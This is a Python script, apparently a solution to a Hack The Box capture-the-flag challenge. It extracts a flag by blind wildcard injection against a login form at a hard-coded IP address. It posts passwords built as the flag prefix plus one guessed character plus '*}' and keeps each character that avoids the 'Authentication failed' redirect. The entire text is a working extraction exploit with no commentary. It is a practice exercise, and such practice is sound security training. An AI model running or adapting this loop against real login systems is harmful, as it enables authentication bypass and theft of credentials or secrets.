#!/usr/bin/env python

import requests
import string
import time

headers = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0"}
url = "http://139.59.181.145:31588/login"

chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
chars += ''.join(['`', '~', '!', '@', '$', '%', '&', '-', '_', "'"])

c = 0
flag = "HTB{"
start = time.time()
while True:
    if c == len(chars):
        flag += "}"
        print(flag)
        break
    password = flag + chars[c] + "*}"
    print("Intento: ", password)

    data = {"username" : "reese", "password" : password}
    response = requests.post(url, headers=headers, data=data)

    if response.url == url + "?message=Authentication%20failed":
        c += 1

    else:
        flag += chars[c]
        c = 0
end = time.time()
print(end-start)

print(flag)
